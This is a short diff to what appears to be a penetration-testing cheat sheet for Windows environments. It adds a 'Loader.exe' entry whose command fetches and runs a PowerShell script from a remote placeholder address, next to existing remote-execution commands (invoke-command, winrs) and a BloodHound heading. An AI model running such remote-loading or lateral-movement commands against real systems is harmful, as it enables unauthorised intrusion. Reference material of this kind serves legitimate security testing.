@@ -71,6 +71,12 @@ C:> invoke-command -ComputerName WCOMPUTER -ScriptBlock {whoami}
 ```powershell
 C:> winrs.exe -r:COMPUTER cmd
 ```
+### Loader.exe
+---
+
+```powershell
+C:> Loader.exe -path http:<ip>/<file>.ps1
+```
 ### BloodHound
 ---
 
